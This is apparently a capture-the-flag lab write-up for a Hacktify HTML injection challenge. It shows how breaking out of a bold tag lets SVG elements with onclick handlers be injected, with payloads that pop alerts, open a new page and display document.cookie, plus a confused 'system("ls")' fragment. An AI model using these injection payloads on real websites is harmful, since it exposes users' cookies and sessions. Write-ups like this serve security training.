# Write Up

## Challenge name
HTML's Are Easy!
https://labs.hacktify.in/HTML/html_lab/lab_1/html_injection_1.php

## Category
HTML injection

## description 
- go to the url
- theres is a search box in the middle of the page
  - it consist of
    - text box and a search button 

## solution
- Searching something in the returns:
```
<center>
  <br>Your Searched results for 
    <b>mytext</b>
</center>
```
- using <>""'`mytxt as inputs
  - return the text without promblems
- adding some tags
- `mytext</b>"<Svg></svg>`
- the </b> breaks and let me add the <svg> tags
```
<center>
  <br>Your Searched results for 
  <b> mytext</b>"
  <svg></svg>
</center>
```
- trying to pop an alert
- `mytext</b>"<Svg onclick=alert()></svg>`
- It worked, clicking the svg element pops an alert

trying more code:
Opening another page with one click
- `mytext</b>"<Svg onclick="window.open('https://www.google.com', '_blank')"></svg>`

Getting cookies
- `mytext</b>"<Svg onclick=alert(document.cookie)></svg>`

----

scripts
```
mytext</b>"<Svg></svg>
system(

mytext</b>"<Svg onclick="window.open('https://www.google.com', '_blank')"></svg>

mytext</b>"<Svg onclick=alert(system("ls"))></svg>
```

